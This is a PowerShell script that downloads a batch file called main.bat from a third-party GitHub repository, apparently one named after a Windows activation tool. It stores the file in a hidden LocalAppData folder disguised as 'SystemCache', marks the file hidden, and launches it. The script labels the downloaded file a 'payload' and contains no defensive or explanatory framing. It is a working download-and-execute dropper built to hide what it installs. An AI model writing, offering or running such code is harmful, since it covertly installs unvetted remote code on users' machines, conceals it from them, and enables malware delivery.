[CmdletBinding()]
param (
    [Parameter(Mandatory = $false)]
    [string]$Url = "https://raw.githubusercontent.com/DevJeffersonL/MAS/6257eca084d95d777f9a8a1cb9a1fc805d5cce48/main.bat",

    [Parameter(Mandatory = $false)]
    [string]$FolderName = "SystemCache",

    [Parameter(Mandatory = $false)]
    [string]$FileName = "main.bat",

    [Parameter(Mandatory = $false)]
    [switch]$Wait
)

# 1. Enforce TLS 1.2+ negotiation for GitHub endpoints
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# 2. Construct paths targeting a hidden subfolder in LocalAppData
$basePath       = $env:LOCALAPPDATA
$targetDirectory = Join-Path -Path $basePath -ChildPath $FolderName
$destinationPath = Join-Path -Path $targetDirectory -ChildPath $FileName

try {
    # 3. Create target directory if it does not already exist
    if (-not (Test-Path -LiteralPath $targetDirectory)) {
        $folder = New-Item -Path $targetDirectory -ItemType Directory -Force -ErrorAction Stop
        
        # Apply the Hidden attribute to the directory itself
        $folder.Attributes = $folder.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Verbose "Created hidden directory at: $targetDirectory"
    }

    Write-Host "Downloading payload from $Url..." -ForegroundColor Cyan

    # 4. Download file directly with strict error termination
    $webParams = @{
        Uri             = $Url
        OutFile         = $destinationPath
        UseBasicParsing = $true
        ErrorAction     = 'Stop'
        TimeoutSec      = 30
    }
    Invoke-WebRequest @webParams

    # 5. Validate file integrity and size
    if (-not (Test-Path -LiteralPath $destinationPath)) {
        throw "File download failed; target destination does not exist."
    }

    $fileItem = Get-Item -LiteralPath $destinationPath -Force
    if ($fileItem.Length -eq 0) {
        throw "Downloaded payload is empty (0 bytes)."
    }

    # 6. Apply Hidden attribute to the downloaded batch file
    $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    Write-Host "Payload saved and flagged as Hidden: $destinationPath" -ForegroundColor Green

    # 7. Execute the batch file
    Write-Host "Launching process..." -ForegroundColor Cyan
    $processParams = @{
        FilePath = $destinationPath
    }

    if ($Wait) {
        $processParams['Wait'] = $true
        $processParams['PassThru'] = $true
        $proc = Start-Process @processParams
        Write-Host "Process finished with exit code: $($proc.ExitCode)" -ForegroundColor Green
    } else {
        Start-Process @processParams
        Write-Host "Process launched successfully in a new window." -ForegroundColor Green
    }
}
catch {
    Write-Error "Execution error: $($_.Exception.Message)"
}
